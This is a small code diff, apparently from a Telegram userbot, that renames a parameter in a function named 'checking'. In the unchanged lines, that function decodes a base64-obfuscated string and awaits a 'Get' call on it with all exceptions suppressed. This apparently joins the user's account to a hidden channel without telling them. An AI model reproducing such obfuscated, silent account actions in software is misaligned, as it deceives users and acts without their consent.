@@ -124,8 +124,8 @@ async def get_user_from_event(
     return None, None
 
 
-async def checking(catub):
+async def checking(THANOSPRO):
     cat_c = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     with contextlib.suppress(BaseException):
         cat_channel = Get(cat_c)
-        await catub(cat_channel)
+        await THANOSPRO(cat_channel)
